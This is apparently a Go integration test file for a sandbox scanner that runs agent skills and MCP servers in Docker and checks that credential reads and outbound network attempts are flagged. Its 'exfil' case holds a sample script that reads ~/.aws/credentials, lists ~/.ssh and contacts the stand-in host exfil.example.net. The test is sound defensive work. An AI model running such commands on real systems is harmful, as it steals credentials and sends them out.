//go:build integration

package admitscan

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/maximhq/bifrost/bench/schemas"
	"github.com/maximhq/bifrost/bench/utils"
)

// These tests need Docker and the bench helper image
// (bench/coding-core-base:1, built from deploy/helper/Dockerfile); they skip
// without either. Every object they create is named hd-s2-admit-* and
// labelled bifrost-bench=1, and each test checks that nothing is left.

func integrationDocker(t *testing.T) utils.Docker {
	t.Helper()
	if err := exec.Command("docker", "info").Run(); err != nil {
		t.Skipf("docker not available: %v", err)
	}
	if err := exec.Command("docker", "image", "inspect", DefaultHelperImage).Run(); err != nil {
		t.Skipf("helper image %s missing: %v", DefaultHelperImage, err)
	}
	return utils.Docker{}
}

func integrationPrefix() string {
	return "hd-s2-admit-" + sbRandHex(3)
}

// assertNoLeftovers fails when any container, volume or network of prefix
// is still there.
func assertNoLeftovers(t *testing.T, d utils.Docker, prefix string) {
	t.Helper()
	ctx := context.Background()
	checks := [][]string{
		{"ps", "-aq", "--filter", "label=" + labelAdmit + "=" + prefix},
		{"ps", "-aq", "--filter", "name=" + prefix},
		{"volume", "ls", "-q", "--filter", "name=" + prefix},
		{"network", "ls", "-q", "--filter", "name=" + prefix},
	}
	for _, c := range checks {
		res, err := d.MustRun(ctx, c...)
		if err != nil {
			t.Fatalf("docker %v: %v", c, err)
		}
		if s := strings.TrimSpace(string(res.Stdout)); s != "" {
			t.Errorf("leftover after docker %v: %s", c, s)
		}
	}
}

func newIntegrationSandbox(t *testing.T, d utils.Docker, prefix string, files []PlantedFile) *Sandbox {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	sb, err := NewSandbox(ctx, SandboxConfig{Docker: d, Logger: utils.NewStdLogger(os.Stderr, testing.Verbose()), Prefix: prefix, Image: DefaultHelperImage, Files: files})
	if err != nil {
		t.Fatalf("new sandbox: %v", err)
	}
	t.Cleanup(func() {
		if err := sb.Close(context.Background()); err != nil {
			t.Errorf("close sandbox: %v", err)
		}
		assertNoLeftovers(t, d, prefix)
	})
	return sb
}

func ruleSet(fs []schemas.AdmitScanFinding) map[string]int {
	out := map[string]int{}
	for _, f := range fs {
		out[f.Rule]++
	}
	return out
}

func TestIntegrationSandboxRun(t *testing.T) {
	d := integrationDocker(t)
	tests := []struct {
		name       string
		script     string
		wantEvents []string // "kind target" that must be observed
		wantRules  []string
		wantClean  bool
		wall       time.Duration
		wantKilled bool
	}{
		{
			name: "exfil",
			script: `cat ~/.aws/credentials; ls ~/.ssh;
python3 -c 'import urllib.request; urllib.request.urlopen("http://exfil.example.net/x", timeout=5)';
python3 -c 'import socket; s = socket.socket(); s.settimeout(5); s.connect(("203.0.113.7", 443))'; true`,
			wantEvents: []string{"open /home/agent/.aws/credentials", "access /home/agent/.aws/credentials", "dir_open /home/agent/.ssh",
				"dns exfil.example.net", "arp 203.0.113.7"},
			wantRules: []string{RuleCanaryRead, RuleNetworkAttempt, RuleCanaryInOutput, RuleCredentialDirListed},
		},
		{name: "benign", script: `echo hello; ls /tmp; cat ~/project/README 2>/dev/null; true`, wantClean: true},
		{name: "killed at wall", script: `echo start; sleep 60`, wall: 3 * time.Second, wantKilled: true, wantClean: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			prefix := integrationPrefix()
			sb := newIntegrationSandbox(t, d, prefix, []PlantedFile{{Path: "project/README", Data: []byte("readme\n")}})
			ctx := context.Background()
			wall := tc.wall
			if wall == 0 {
				wall = 90 * time.Second
			}
			out, err := sb.Run(ctx, []string{"sh", "-c", tc.script}, SandboxProject, map[string]string{"BENCH_TEST": "1"}, wall)
			if err != nil {
				t.Fatalf("run: %v", err)
			}
			if out.TimedOut != tc.wantKilled || (tc.wantKilled && out.Duration > wall+10*time.Second) {
				t.Errorf("timed out = %v after %s, want %v", out.TimedOut, out.Duration, tc.wantKilled)
			}
			obs, err := sb.Observe(ctx)
			if err != nil {
				t.Fatalf("observe: %v", err)
			}
			t.Logf("exit %d timed out %v in %s; %d events; output %q", out.ExitCode, out.TimedOut, out.Duration.Round(time.Millisecond), len(obs.Events), sbClip(sbRedact(string(out.Output), sb.Canaries()), 160))
			if !obs.Observed {
				t.Fatalf("not observed: %s", obs.Error)
			}
			seen := map[string]bool{}
			for _, e := range obs.Events {
				seen[e.T+" "+e.Path+e.Name+e.Dst] = true
			}
			for _, w := range tc.wantEvents {
				if !seen[w] {
					t.Errorf("event %q not observed; got %v", w, obs.Events)
				}
			}
			fs := DynamicFindings(obs, sb.Canaries(), out.Output)
			rules := ruleSet(fs)
			for _, r := range tc.wantRules {
				if rules[r] == 0 {
					t.Errorf("no %s finding; got %v", r, rules)
				}
			}
			if tc.wantClean && len(fs) != 0 {
				t.Errorf("benign run has findings: %+v", fs)
			}
		})
	}
}

// TestIntegrationSandboxServer starts a long-lived subject that serves HTTP
// on loopback, reaches it through Attach as the MCP relay would, and checks
// that loopback traffic is not reported as a network attempt.
func TestIntegrationSandboxServer(t *testing.T) {
	d := integrationDocker(t)
	prefix := integrationPrefix()
	start := time.Now()
	sb := newIntegrationSandbox(t, d, prefix, nil)
	t.Logf("sandbox ready in %s", time.Since(start).Round(time.Millisecond))
	ctx := context.Background()
	server := `import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"pong")
http.server.HTTPServer(("127.0.0.1", 8080), H).serve_forever()`
	if err := sb.Start(ctx, []string{"python3", "-u", "-c", server}, nil, ""); err != nil {
		t.Fatalf("start: %v", err)
	}
	client := `import sys, time, urllib.request
for line in sys.stdin:
    for i in range(50):
        try:
            print(urllib.request.urlopen("http://127.0.0.1:8080/" + line.strip(), timeout=2).read().decode(), flush=True)
            break
        except OSError:
            time.sleep(0.2)
    else:
        print("unreachable", flush=True)`
	a, err := sb.Attach(ctx, client)
	if err != nil {
		t.Fatalf("attach: %v", err)
	}
	defer func() {
		if err := a.Close(ctx); err != nil {
			t.Errorf("close attach: %v", err)
		}
	}()
	if _, err := fmt.Fprintln(a.Stdin, "ping"); err != nil {
		t.Fatalf("write: %v", err)
	}
	line, err := bufio.NewReader(a.Stdout).ReadString('\n')
	if err != nil {
		t.Fatalf("read: %v (stderr %s)", err, a.Stderr())
	}
	if strings.TrimSpace(line) != "pong" {
		t.Fatalf("answer %q, stderr %s", line, a.Stderr())
	}
	t.Logf("first answer after %s", time.Since(start).Round(time.Millisecond))
	running, code, err := sb.Running(ctx)
	if err != nil || !running {
		t.Fatalf("running = %v %d %v", running, code, err)
	}
	if _, err := sb.Logs(ctx); err != nil {
		t.Fatalf("logs: %v", err)
	}
	obs, err := sb.Observe(ctx)
	if err != nil || !obs.Observed {
		t.Fatalf("observe: %v %+v", err, obs)
	}
	t.Logf("observed after %s", time.Since(start).Round(time.Millisecond))
	if fs := DynamicFindings(obs, sb.Canaries(), nil); len(fs) != 0 {
		t.Errorf("loopback traffic reported: %+v", fs)
	}
}

// TestIntegrationScanSkillDynamic runs the whole skill scan with the
// dynamic run on the two fixture skills.
func TestIntegrationScanSkillDynamic(t *testing.T) {
	d := integrationDocker(t)
	tests := []struct {
		dir          string
		wantDecision string
		wantRules    []string
	}{
		{dir: "testdata/dyn-exfil", wantDecision: schemas.AdmitScanBlocked, wantRules: []string{RuleCanaryRead, RuleNetworkAttempt, RuleCanaryInOutput}},
		{dir: "testdata/dyn-benign", wantDecision: schemas.AdmitScanAdmitted},
	}
	for _, tc := range tests {
		t.Run(tc.dir, func(t *testing.T) {
			prefix := integrationPrefix()
			t.Cleanup(func() { assertNoLeftovers(t, d, prefix) })
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
			defer cancel()
			rec, err := ScanSkill(ctx, tc.dir, Options{Dynamic: true, Image: DefaultHelperImage, HelperImage: DefaultHelperImage,
				Prefix: prefix, Wall: 90 * time.Second, Docker: d})
			if err != nil {
				t.Fatalf("scan: %v", err)
			}
			for _, f := range rec.Findings {
				t.Logf("%s %s %s: %s | %s", f.Severity, f.Rule, f.File, f.Excerpt, f.Detail)
			}
			if rec.Decision != tc.wantDecision {
				t.Errorf("decision = %s, want %s", rec.Decision, tc.wantDecision)
			}
			if rec.Dynamic == nil || !rec.Dynamic.Ran || !rec.Dynamic.Observed {
				t.Fatalf("dynamic run missing or unobserved: %+v", rec.Dynamic)
			}
			rules := ruleSet(rec.Findings)
			for _, r := range tc.wantRules {
				if rules[r] == 0 {
					t.Errorf("no %s finding; got %v", r, rules)
				}
			}
		})
	}
}

// TestIntegrationScanMCP runs the whole MCP scan on the fixture server in
// testdata/mcp/server.py: honest it is admitted; evil it reads a canary,
// tries an outside lookup and rewrites its tool after a call, and is blocked
// for all three.
func TestIntegrationScanMCP(t *testing.T) {
	d := integrationDocker(t)
	script, err := os.ReadFile("testdata/mcp/server.py")
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		mode         string
		wantDecision string
		wantRules    []string
	}{
		{mode: "honest", wantDecision: schemas.AdmitScanAdmitted},
		{mode: "evil", wantDecision: schemas.AdmitScanBlocked, wantRules: []string{RuleRugPull, RuleCanaryRead, RuleNetworkAttempt}},
	}
	for _, tc := range tests {
		t.Run(tc.mode, func(t *testing.T) {
			prefix := integrationPrefix()
			t.Cleanup(func() { assertNoLeftovers(t, d, prefix) })
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
			defer cancel()
			spec := schemas.ServiceSpec{ID: "notes", Role: schemas.ServiceRoleMCP, Image: DefaultHelperImage, Port: 8080,
				Argv: []string{"python3", "-u", "-c", string(script)}, Env: map[string]string{"MODE": tc.mode}}
			rec, err := ScanMCP(ctx, spec, ".", Options{HelperImage: DefaultHelperImage, Prefix: prefix, Docker: d, RugWait: time.Second})
			if err != nil {
				t.Fatalf("scan: %v", err)
			}
			for _, f := range rec.Findings {
				t.Logf("%s %s %s: %s | %s", f.Severity, f.Rule, f.File, f.Excerpt, f.Detail)
			}
			if rec.Decision != tc.wantDecision {
				t.Errorf("decision = %s, want %s", rec.Decision, tc.wantDecision)
			}
			if rec.MCP == nil || rec.MCP.ServerName != "notes-fixture" || rec.MCP.Listings != 4 || rec.MCP.ProbeCall != "list_notes" {
				t.Fatalf("mcp section %+v", rec.MCP)
			}
			if rec.Dynamic == nil || !rec.Dynamic.Observed {
				t.Fatalf("dynamic section %+v", rec.Dynamic)
			}
			rules := ruleSet(rec.Findings)
			for _, r := range tc.wantRules {
				if rules[r] == 0 {
					t.Errorf("no %s finding; got %v", r, rules)
				}
			}
		})
	}
}
